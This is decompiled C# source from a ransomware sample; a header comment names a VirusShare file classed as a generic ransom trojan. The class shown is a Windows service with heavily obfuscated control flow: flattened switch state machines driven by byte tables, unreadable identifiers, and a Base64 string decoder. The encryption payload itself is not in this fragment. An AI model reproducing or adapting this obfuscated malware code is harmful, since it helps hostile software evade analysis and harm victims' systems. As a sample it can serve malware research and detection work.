// Decompiled with JetBrains decompiler
// Type: Ⴃ.ႳႰ
// Assembly: mac, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4DC2FD3D-9120-41A8-AE25-CC48D06B9902
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-4340105078ffe071abe405ad3dc31e12fd66187057ce4929d7c0f635218805af.exe

using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.ServiceProcess;

namespace Ⴃ
{
  internal sealed class ႳႰ : ServiceBase
  {
    private IContainer Ⴃ;

    public ႳႰ() => this.Ⴐ();

    protected override void OnStart([In] string[] obj0)
    {
    }

    protected override void OnStop()
    {
    }

    protected override void Dispose([In] bool obj0)
    {
      byte[] ⴐ = ႷႨ.Ⴐ;
      int num1 = 0;
      while (true)
      {
        switch (num1)
        {
          case 1:
            goto label_9;
          case 2:
            int num2;
            if (this.Ⴃ != null)
              num2 = 4;
            else
              goto label_6;
label_5:
            num1 = num2;
            continue;
label_6:
            int num3 = (int) ⴐ[436];
            Ⴃ.ႣႣ.Ⴍ[115] = (byte) (((int) Ⴃ.ႣႣ.Ⴍ[115] ^ (int) Ⴃ.ႣႣ.Ⴍ[140]) & 240);
            num2 = num3 - 180;
            goto label_5;
          case 3:
            goto label_8;
          case 4:
          case 5:
            goto label_7;
          case 6:
            goto label_10;
          default:
            num1 = !obj0 ? 3 : 2;
            continue;
        }
      }
label_9:
      return;
label_10:
      return;
label_7:
      this.Ⴃ.Dispose();
label_8:
      base.Dispose(obj0);
    }

    private void Ⴐ()
    {
      this.Ⴃ = (IContainer) new Container();
      ႳႰ.Ⴄ<ServiceBase, string>((ServiceBase) this, ႭႭ.Ⴈ(typeof (ႤႨ), 15L, 0, 1951761874), (short) 530, 'ɺ');
    }

    static ႳႰ() => ႳႣ.Ⴅ();

    internal static void Ⴄ<\u0021\u00210, \u0021\u00211>(
      [In] \u0021\u00210 obj0,
      [In] \u0021\u00211 obj1,
      [In] short obj2,
      [In] char obj3)
      where \u0021\u00210 : ServiceBase
      where \u0021\u00211 : string
    {
      byte[] ⴍ = Ⴃ.ႣႣ.Ⴍ;
      char[] ⴗ = ႷႼ.Ⴗ;
      byte[] ⴐ = ႷႨ.Ⴐ;
      int num1 = 5;
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_10;
          case 1:
            int num3;
            switch (((int) obj2 ^ (int) obj3) - 104 ^ num2)
            {
              case 0:
                num3 = (int) ⴍ[203] - 175;
                break;
              default:
                num3 = 7;
                break;
            }
            num1 = num3;
            continue;
          case 2:
            goto label_11;
          case 3:
          case 4:
            obj0.ServiceName = (string) obj1;
            goto case 6;
          case 6:
            ++num2;
            num1 = 34 < 102 / 3 - 10 ? (int) ⴍ[45] : (int) ⴐ[103];
            continue;
          case 7:
          case 8:
            num1 = (int) ⴗ[8] - 17362;
            continue;
          default:
            num2 = 0;
            num1 = (int) ⴍ[45];
            continue;
        }
      }
label_10:
      return;
label_11:;
    }

    internal static byte[] Ⴗ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] int obj1, [In] short obj2) where \u0021\u00210 : string
    {
      byte[] ⴐ = ႷႨ.Ⴐ;
      byte[] ⴍ = Ⴃ.ႣႣ.Ⴍ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴐ[236] - 166;
      Array array;
      while (true)
      {
        switch (num2)
        {
          case 0:
            ++num1;
            int num3 = (int) obj2;
            num2 = (num3 * num3 + (int) obj2) % 2 == 0 ? 3 : (int) ⴍ[142] - 239;
            continue;
          case 1:
          case 4:
            array = (Array) Convert.FromBase64String((string) obj0);
            num2 = 0;
            continue;
          case 2:
            array = (Array) null;
            goto case 6;
          case 3:
            goto label_13;
          case 5:
            int num4;
            switch (((int) obj2 ^ obj1) - 53 ^ num1)
            {
              case 0:
                num4 = (int) ⴍ[11];
                break;
              default:
                num4 = (int) ⴍ[25];
                break;
            }
            num2 = num4;
            continue;
          case 6:
            num2 = 0;
            continue;
          case 7:
          case 8:
            goto label_3;
          case 9:
            num2 = 5;
            continue;
          case 11:
            num2 = (int) ⴐ[288] - 223;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႳႰ.Ⴗ);
            num2 = 7;
            continue;
        }
      }
label_13:
      return array as byte[];
    }

    internal delegate void ႣႣ();
  }
}
